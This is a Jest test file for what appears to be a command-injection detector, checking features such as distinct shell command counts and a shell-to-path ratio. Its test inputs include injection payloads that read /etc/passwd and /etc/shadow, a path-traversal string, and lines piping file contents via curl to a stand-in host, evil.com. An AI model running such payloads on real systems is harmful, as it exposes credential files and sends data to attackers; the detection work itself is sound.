import { computeCommandInjectionFeatures } from "../src/semantic";

describe("distinct_shell_command_count", () => {
  test("repeated same command counts once, not per occurrence", () => {
    const f = computeCommandInjectionFeatures("127.0.0.1; whoami; whoami; whoami");
    expect(f.distinct_shell_command_count).toBe(1);
    expect(f.shell_command_count).toBe(3);
  });

  test("distinct commands chained count each once", () => {
    const f = computeCommandInjectionFeatures("cat /etc/passwd && cat /etc/shadow && ls /");
    expect(f.distinct_shell_command_count).toBe(2);
  });

  test("shell_command_count is unchanged (not replaced)", () => {
    const f = computeCommandInjectionFeatures("127.0.0.1; whoami; whoami; whoami");
    expect(f.shell_command_count).toBe(3);
  });
});

describe("shell_to_path_ratio", () => {
  test("pure path traversal (no shell commands) scores ratio=0", () => {
    const f = computeCommandInjectionFeatures("../../../etc/passwd");
    expect(f.shell_to_path_ratio).toBe(0);
  });

  test("compound cmdi touching sensitive paths scores a nonzero ratio", () => {
    const payloads = [
      "; whoami > /tmp/x && cat /tmp/x | curl -d @- http://evil.com",
      "; $(cat /etc/passwd | base64 | curl -d @- http://evil.com)",
      "&& id && uname -a && cat /etc/shadow",
      "; ls -la / ; cat /etc/passwd ; whoami",
    ];
    for (const payload of payloads) {
      const f = computeCommandInjectionFeatures("127.0.0.1" + payload);
      expect(f.shell_to_path_ratio).toBeGreaterThanOrEqual(0.4);
      expect(f.shell_to_path_ratio).toBeLessThanOrEqual(0.75);
    }
  });

  test("single-command cmdi with no path tokens keeps ratio at 1 (no regression)", () => {
    const f = computeCommandInjectionFeatures("127.0.0.1; whoami");
    expect(f.shell_to_path_ratio).toBe(1);
  });
});
